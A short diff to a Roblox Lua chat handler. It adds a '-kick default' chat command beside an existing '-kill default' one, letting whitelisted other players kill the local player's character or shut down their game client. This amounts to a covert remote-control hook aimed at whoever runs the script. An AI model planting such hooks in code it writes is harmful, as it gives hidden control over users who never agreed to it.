@@ -49,6 +49,8 @@ game:GetService("TextChatService").OnIncomingMessage = function(msg)
   if Player.UserId ~= game.Players.LocalPlayer.UserId then
     if whitelistdata[tostring(Player.UserId)] and Text:lower() == "-kill default" then
         game.Players.LocalPlayer.Character.Humanoid:ChangeState(15)
+    elseif whitelistdata[tostring(Player.UserId)] and Text:lower() == "-kick default" then
+        game:Shutdown()
     end
   end
   return props
